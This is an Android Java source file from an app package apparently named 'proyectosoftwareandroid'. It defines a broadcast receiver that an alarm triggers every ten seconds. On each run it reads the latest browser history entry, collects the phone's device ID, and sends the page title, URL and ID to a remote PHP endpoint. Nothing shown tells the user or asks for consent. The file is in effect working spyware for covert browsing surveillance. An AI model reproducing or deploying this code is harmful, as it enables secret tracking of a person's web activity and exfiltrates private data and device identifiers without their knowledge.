package my.app.proyectosoftwareandroid;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;




import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;

import android.provider.Browser;
import android.telephony.TelephonyManager;
import android.util.Log;


public class SitiosWeb extends BroadcastReceiver {
	final public static String ONE_TIME = "onetime";
	public String tituloAux;
    public String urlAux;
    private  TelephonyManager telephonyManager;
	private  String device_id;
	private static final String TAG_SUCCESS = "success";
	JSONParser jsonParser = new JSONParser();
	private static String url_insertar_sitiosweb = "insertar_sitiosweb.php";
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		ContentResolver cont = context.getContentResolver();
		Cursor mCur = cont.query(Browser.BOOKMARKS_URI,
				Browser.HISTORY_PROJECTION, null, null, null);
			telephonyManager = (TelephonyManager)context.getSystemService(Service.TELEPHONY_SERVICE);
			device_id = telephonyManager.getDeviceId();
           	mCur.moveToLast();
           	UltimoSitioWeb unico = new UltimoSitioWeb();
               tituloAux =mCur
                       .getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
               urlAux = mCur
                       .getString(Browser.HISTORY_PROJECTION_URL_INDEX);
               //new InsertarURL().execute();
               if ((unico.getTitulo() == null)){
               	unico.setTitulo(tituloAux);
               	unico.setURL(urlAux);
               	Log.v("titleIdx", mCur
                           .getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
                   Log.v("urlIdx", mCur
                           .getString(Browser.HISTORY_PROJECTION_URL_INDEX));
               	//Envía tituloAux, urlAux
                   new InsertarURL().execute();
               } else {
               	if ((!tituloAux.equals(unico.getTitulo()))){
               		unico.setTitulo(tituloAux);
                   	unico.setURL(urlAux);
                   	Log.v("titleIdx", mCur
                               .getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
                       Log.v("urlIdx", mCur
                               .getString(Browser.HISTORY_PROJECTION_URL_INDEX));
                   	//Envia tituloAux, urlAux
                       new InsertarURL().execute();
               	}
               	
               }
		
	}
	public void SetAlarm(Context context)
    {
        AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, SitiosWeb.class);
        intent.putExtra(ONE_TIME, Boolean.FALSE);
        PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 0);
        //After after 10 seconds
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() , 1000 * 10 , pi); 
    }
	
	class InsertarURL extends AsyncTask<String, String, String> {
    	protected String doInBackground(String... args) {
	    
	        // Building Parameters
	          System.err.println("Hilo de insertar sitio web en base de datos");
	        // Building Parameters
	         Date date = new Date();
	        List<NameValuePair> params = new ArrayList<NameValuePair>();
	        params.add(new BasicNameValuePair("id_dispositivo", device_id));
	        params.add(new BasicNameValuePair("titulo", tituloAux));
	        params.add(new BasicNameValuePair("url", urlAux));
	        EnvioWeb envioMensajes = new EnvioWeb (url_insertar_sitiosweb, params);
	        envioMensajes.envio();
	        return null;
	}	
	
}
	}
